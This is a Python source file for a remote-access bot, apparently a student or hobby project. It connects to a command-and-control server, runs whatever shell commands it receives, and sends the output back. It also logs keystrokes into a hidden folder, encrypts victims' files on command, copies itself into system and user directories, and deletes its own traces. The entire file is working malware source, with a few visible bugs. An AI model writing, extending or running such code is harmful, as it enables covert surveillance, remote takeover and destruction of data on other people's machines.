#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from subprocess import PIPE, run # Import subprocess to execute system commands.
	import os # Import os for devnull, remove, mkdir, chdir
	from sys import exit # Import exit from sys to quit program when specified.
	from platform import system # Import system from platform to detect os.
	from pynput import keyboard # Import keyboard to perform keylogger operations.
	from threading import Timer # Import Timer to create thread that'll run every 20s.
	from cryptography.fernet import Fernet # Import Fernet for encryption.
except ImportError as e:
    print(f"Import error: {e}")
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS  #
FILENAME = __file__[2:]
SYSTEM = system()
IP = "192.168.31.134" # IP address to connect to.
PORT = 1337 # Port number to create socket with.
DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
LOG = '' # Will store the keystrokes of the user.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def create_client_socket():
	"""This function creates a client socket to connect to 
		our command & control server.
		Arguments:
			ip_addr (str): The IP address of our C&C server.
			port (int): The port number of the C&C server to connect to.
		Returns:
			This function will return a socket object.
	"""
	client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Initializing socket.
	ip_port = (IP, PORT) # Tuple containing IP address and port number.
	client_sock.connect(ip_port) # Connecting to server.
	initial_message = system() # Send IP address and OS information.
	client_sock.send(initial_message.encode('utf-8')) # Send message with this host's IP back to the server.
	return client_sock # Return the created client socket.
		
def self_delete():
	"""This function will be invoked when the C&C server enter's the
		keyword "self-destruct" and which will instruct the program to
		delete traces of itself.
		Arguments:
			None
		Returns:
			None
	"""
	fullpath = os.path.abspath(FILENAME) # Full path of the file.
	if SYSTEM == 'Linux':
		try:
			'''
			Delete all copies of this file from the Linux file
			system.
			'''
			run(['rm', '/tmp/' + FILENAME])
			run(['rm', '/etc/' + FILENAME])
			run(['rm', '/tmp/' + FILENAME])
			run(['rm', fullpath])
		except:
			return r"Couldnt remove all files..."
		return r"Deleted all files..."
	else:
		try:
			'''
			Delete all copies of this file from the Windows file
			system.
			'''
			run(['del', r'%temp%\\' + FILENAME])
			run(['del', r'C:\Users\%username%\\' + FILENAME])
			run(['del', r'C:\Users\%username%\\AppData\\' + FILENAME])
			run('del', fullpath)
		except:
			return r"Couldn't remove all files..."
		return r"Deleted all files..."

def propagate(name: str):
	"""This function will create other instances of this file in 
		other directories on the victim's machines when the keyword
		"propogate" is used.
		Arguments:
			name (str): The name of this file.
		Returns:
			None
	"""
	if SYSTEM == 'Linux':
		try:
			run(['cp', name, '/tmp'])
			run(['cp', name, '/etc'])
			run(['cp', name, '/var'])
		except:
			return r"Unable to propagate..."
		return r"File has been cloned to /tmp /etc and /var folders..."
	else:
		try:
			run(['copy', name, r'%temp%'])
			run(['copy', name, r'C:\Users\%username%\\'])
			run(['copy', name, r'C:\Users\%username%\AppData\\'])
		except:
			return r"Unable to propagate..."	
		return r"File has been cloned to temp, C:\Users\[current user]\, and AppData\..."

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

# Keylogger stuff-=-=-=-=-=-=-=-=-=-=-=-=-=-
def on_press(key):
	"""
	"""
	global LOG
	try:
		LOG += str(key.char)
	except AttributeError:
		if key == key.space:
			LOG += ' '
		elif key == key.enter: LOG += '\n'
		elif key == key.backspace: LOG += ''
		elif key == key.ctrl: LOG += ' ctrl+'
		elif key == key.tab: LOG += '\t'
		else:
			LOG += str(key)

def log_to_file():
	"""This function will log collected keystrokes to a text file in the
	/tmp folder.
		Arguments:
			None
		Returns:
			None
	"""
	f = open(DIRECTORY + 'log.txt', 'a+')
	f.write(LOG)
	cycle = Timer(SECONDS_TO_LOG, log_to_file)
	cycle.start()

def keylogger():
	"""This function will start a keylogger in the background.
		Arguments:
			None
		Returns:
			None
	"""
	with keyboard.Listener(
		onpress=on_press) as capturer:
		try:
			os.mkdir(DIRECTORY) # Attempt to create hidden directory in temp folder.
			capturer.join()
		except OSError:
			pass

	return "Keylogger initiated..."

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def crypto(action, *request):
	"""This function will handle all of our encryption/decryption processes.
		Argument:
			None
		Returns:
			None
	"""
	key_copy = ''
	def encrypt_it():
		to_encrypt = request
		with open(to_encrypt, 'rb') as inf:
			data = inf.read()
			with open(to_encrypt, 'wb') as ouf:
				key = Fernet.generate_key()
				key_copy = key
				cipher = Fernet(key)
				with open('key.key', 'wb') as keyfile:
					keyfile.write(key)
				cipher_text = cipher.encrypt(data)
				ouf.write(cipher_text)

		return 'File encrypted... Key = ' + key_copy
	
	def decrypt_it():
		to_encrypt, key = request
		with open(to_encrypt, 'rb') as inf:
			data = inf.read()
			with open(to_encrypt, 'wb') as ouf:
				key = open('key.key', 'rb').read()
				cipher = Fernet(key)
				os.remove('key.key')
				plain_text = cipher.decrypt(data)
				ouf.write(plain_text)

		return "File Decrypted..."

	if action == 'encrypt':
		return encrypt_it()
	else:
		return decrypt_it()


""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
		pass

	def exec_windows_cmd(self, command: str):
		"""This function will execute Windows commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			output = run(command, # Run command.
						shell=True, # Invoking a shell.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
			return output.stdout
		except:
			try:
				os.chdir(command[3:])
				return "Ok"
			except:
				return "Invalid command..."

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock:
				while True:
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = None
					if command.strip() == 'keylog':
						command_output = keylogger()
					elif command[:7] == 'encrypt':
						command_output = crypto(command[:7], command[8:])
					elif command[:7] == 'decrypt':
						command_output = crypto(command[7:], command[8:].split())
					elif command.strip() == 'propagate':
						command_output = propagate(FILENAME)
					elif command.strip() == 'destory':
						command_output = self_delete()
					else:
						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			sock.close()
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
	    pass

	def exec_linux_cmd(self, command: str):
		"""This function will execute Linux commands requested by the C&C.
			Argments:
				command (str): The command that will be executed on the victim's machine.
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
		try:
			output = run(command.split(), # Run command.
						stdout=PIPE, # Pipe command to store in variable.
						stderr=DEVNULL)	# Send standard error to devnull.
			return output.stdout
		except:
			try:
				os.chdir(command[3:])
				return "Ok"
			except:
				return "Invalid command..."

	def handle_request(self):
		"""This function will handle all tasks related to request made by the server.
			Arguments:
				None
			Returns:
				None
		"""
		sock = create_client_socket() # Store socket object.
		try:
			with sock:
				while True:
					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
					command_output = None
					if command.strip() == 'keylog':
						command_output = keylogger()
					elif command[:7] == 'encrypt':
						command_output = crypto(command[:7], command[8:])
					elif command[:7] == 'decrypt':
						command_output = crypto(command[7:], command[8:].split())
					elif command.strip() == 'propagate':
						command_output = propagate(FILENAME)
					elif command.strip() == 'destory':
						command_output = self_delete()
					else:
						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
		except:
			sock.close()
			exit(1)

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	obj = None
	if SYSTEM == "Linux": # Check if operating system is Linux.
		obj = LinuxBot() # If Linux, instantiate LinuxBot object.
	else:
		obj = WindowsBot() # Else, instantiate WindowsBot object.

	obj.handle_request()

if __name__ == '__main__':
    main()
